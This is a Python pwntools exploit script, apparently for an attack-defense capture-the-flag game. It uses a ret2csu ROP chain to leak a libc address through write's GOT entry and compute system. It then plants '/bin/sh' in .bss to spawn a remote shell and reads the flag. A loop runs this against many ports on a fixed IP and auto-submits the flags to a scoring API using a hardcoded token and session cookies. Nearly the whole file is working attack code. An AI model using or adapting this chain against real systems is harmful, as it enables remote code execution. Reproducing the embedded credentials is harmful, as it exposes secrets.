from pwn import *
import time
import requests

def get_flag(port):
    try:
        flag=''
        p = remote('117.136.139.102',port,timeout=3)
        elf = ELF("./pwn")
        libc = ELF("./libc-2.23.so")
        
        bss_addr = elf.bss(0x10)
        got_write = elf.got['write']
        got_read = elf.got['read']
        
        # log.success("The write got address is" + hex(got_write))
        # log.success("The read got address is" + hex(got_read))
        
        main = 0x400587
        
        def leak(address):
            p.recv()
            payload = "\x00"*136
            payload += p64(0x400616) + p64(0) + p64(0) + p64(1) + p64(got_write) + p64(8) + p64(address) + p64(1)
            payload += p64(0x400600)
            payload +="\x00"*56
            payload += p64(main)
            # gdb.attach(p)
            p.send(payload)
            data = p.recv(8)
            return data
        # dynelf = DynELF(leak,elf=elf)
        # system_addr = dynelf.lookup("system","libc")
        # log.success("The system address is" + hex(system_addr))
        
        write_addr = u64(leak(got_write))
        # print "write: " + hex(write_addr)
        # print "bss: " +hex(bss_addr)
        system_addr = write_addr-libc.symbols['write'] + libc.symbols['system']
        binsh = '/bin/sh'
        # log.success("The system address is: " + hex(system_addr))
        
        
        payload2 = "\x00"*136
        payload2 += p64(0x400616) + p64(0) +p64(0) + p64(1) +p64(got_read) +p64(16)+p64(bss_addr)+p64(0)
        payload2 += p64(0x400600)
        payload2 += "\x00"*56
        payload2 += p64(main)
        # raw_input()
        p.send(payload2)
        time.sleep(1)
        system_sh = p64(system_addr)+binsh
        p.send(system_sh)
        
        # p.recvuntil("1234567890123\n")
        
        payload3 = "\x00"*136
        payload3 += p64(0x400616) + p64(0) +p64(0) +p64(1) +p64(bss_addr) +p64(0) +p64(0) +p64(bss_addr+8)
        payload3 += p64(0x400600)
        payload3 += "\x00"*56
        payload3 += p64(main)
        # raw_input()
        p.send(payload3)
        p.recv()
        # p.interactive()
        p.sendline('cat flag')
        p.recv()
        p.sendline('cat flag')
        flag=p.recv()
        # print port +":"+flag
        p.close()
    except:
        p.close()
        return False
    return flag


def get_ip():
    ip_list=[]
    f=open("port.txt",'r')
    while 1:
        line = f.readline()
        if line != "":
            ip_list.append(line.strip())
        if not line:
            break
    f.close()
    return ip_list


# def submit_flag(flag):
#     url="http://117.136.139.102:16080/api/submit-flag"
#     rawBody = "{'token':'sBzVpXLGsyhbadevqqQniqB1RXrB0mpMhq5e0VBi','flag':"+flag+"}"
#     cookies = {"MEIU_AUTH":"c632lKv%2BO9eD2e6s94ac%2BGoDdNI7QSM4Enp2wHDjR%2FjSCRI%2F94uJQ9bOppftHy%2BbzF7b0ohUTHcrj5ZFc5TG7X4ltx8","session":"ab246fd0-a3e4-44fb-b6ad-b86a4be30390"}
#     check = "<Response [200]>"
#     try:
#         a = requests.post(url,data = rawBody,cookies = cookies)
#         if a.status_code==200:
#             print "Submit flag success"
#         else:
#             print "submit flag failed: " +i
#     except:
#         print "something is wrong ,please check!"

def submit_flag(flag):
    session = requests.Session()
    rawBody = "{\"token\":\"sBzVpXLGsyhbadevqqQniqB1RXrB0mpMhq5e0VBi\",\"flag\":\""+flag+"\"}"
    # print rawBody
    headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer":"http://117.136.139.102:16080/index","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","DNT":"1","Content-Type":"application/json;charset=utf-8"}
    cookies = {"MEIU_AUTH":"c632lKv%2BO9eD2e6s94ac%2BGoDdNI7QSM4Enp2wHDjR%2FjSCRI%2F94uJQ9bOppftHy%2BbzF7b0ohUTHcrj5ZFc5TG7X4ltx8","session":"ab246fd0-a3e4-44fb-b6ad-b86a4be30390"}
    response = session.post("http://117.136.139.102:16080/api/submit-flag", data=rawBody, headers=headers, cookies=cookies)
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if response.status_code==200 and "Accepted" in response.content:
        print "Submit flag success " + flag
    else:
        print "submit flag failed: " + flag



if __name__ == '__main__':
    while True:
        for i in get_ip():
            try:
                flag=get_flag(i)
                if flag:
                    # print "flag is "+flag
                    submit_flag(flag)
                    with open('flag.txt','a') as f:
                        f.write(i+":"+flag+'\n')
            except:
                pass
            sleep(2)